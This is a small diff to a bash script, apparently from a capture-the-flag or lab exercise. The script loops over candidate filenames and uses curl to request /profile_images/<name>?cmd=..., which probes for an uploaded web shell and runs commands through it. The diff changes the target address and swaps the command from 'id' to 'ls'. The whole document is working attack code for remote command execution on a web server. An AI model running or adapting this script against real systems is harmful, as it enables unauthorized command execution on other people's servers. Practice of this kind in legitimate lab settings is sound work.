@@ -6,6 +6,6 @@ input=$1
 while IFS= read -r line
 do
         echo 'doing' $line':'
-        curl -I http://83.136.254.167:42997/profile_images/$line?cmd=id
+        curl -I http://94.237.62.149:34543/profile_images/$line?cmd=ls
 done < "$input"
 
